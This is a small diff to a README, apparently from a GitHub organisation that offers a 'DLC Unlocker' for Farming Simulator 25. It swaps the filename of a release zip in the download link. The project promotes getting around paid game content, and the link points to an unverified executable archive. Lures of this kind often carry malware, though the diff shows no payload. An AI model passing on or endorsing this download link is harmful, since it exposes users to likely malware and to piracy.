@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.0+ Release](https://github.com/Farming-Simulator-2025-DLC-Unlocker/.github/releases/download/ver.112/FS25-DLC-Manager.zip) = `*Tool files & folder*`
+- [💾 v.1.0+ Release](https://github.com/Farming-Simulator-2025-DLC-Unlocker/.github/releases/download/ver.112/fs25-dlc-unlocker.zip) = `*Tool files & folder*`
 
 ---
 
